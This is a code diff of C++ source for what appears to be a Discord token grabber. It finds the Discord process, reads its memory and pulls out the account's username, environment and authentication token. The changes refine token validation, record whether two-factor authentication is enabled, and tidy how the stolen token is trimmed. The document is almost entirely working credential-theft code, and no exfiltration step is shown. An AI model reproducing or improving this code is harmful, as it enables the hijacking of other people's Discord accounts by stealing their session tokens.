@@ -4,7 +4,8 @@
 // create object to struct
 proc procInfo;
 
-
+// save information in discordInformation type
+discordInformation account;
 
 std::wstring GetProcName(DWORD aPid)
 {
@@ -147,6 +148,7 @@ uint32_t GetProcessBaseAddress(DWORD processID)
 
                     if (EnumProcessModules(processHandle, moduleArray, bytesRequired, &bytesRequired))
                     {
+                        // first module is the base of the executeable
                         baseAddress = (uint32_t)moduleArray[0];
                     }
 
@@ -162,20 +164,40 @@ uint32_t GetProcessBaseAddress(DWORD processID)
     return baseAddress;
 }
 
-bool isToken(char tokenBuffer[]) {
-
-    // checks
-
-    if (tokenBuffer[3] == '.') {
-        return true;
+bool containsWhitespace(char const* c) {
+    char temp = *c;
+    if (temp != '\0') {
+        if (isspace(temp))
+            return true;
     }
     else {
         return false;
     }
+    return containsWhitespace(++c);
+}
+
+bool isToken(char tokenBuffer[]) {
+
+
+    // 2 factor check
+    if (tokenBuffer[3] == '.') {
+        account.user.twofactor = true;
+    }
+    else {
+        // 2 factor disabled
+        account.user.twofactor = false;
+    }
+
+    // checks
+    if (containsWhitespace(tokenBuffer)) {
+        return false;
+    }
+    else {
+        return true;
+    }
+    return true;
 }
 discordInformation procManager::scan() {
-    // save information in discordInformation type
-    discordInformation account;
     // JSON struct
     nlohmann::json accountJSON;
 
@@ -222,6 +244,14 @@ discordInformation procManager::scan() {
     MEMORY_BASIC_INFORMATION rgninfo{};
 
     rgninfo.BaseAddress;
+
+    // check if process has been found
+    if (!procInfo.pid) {
+        std::cout << "[+] Process has not been found." << std::endl;
+        exit(EXIT_FAILURE);
+    }
+
+
 
     // allocate space to save json
     char resultJSON[140];
@@ -317,8 +347,9 @@ discordInformation procManager::scan() {
         std::string username = accountJSON["user"]["username"];
         std::string token = tokenJSON;
 
-        // remove last character. (corrupted).
-        token.substr(0, token.length() - 2);
+        // remove last character
+        token.pop_back();
+
 
         // pass string to struct
         account.environment = environment;
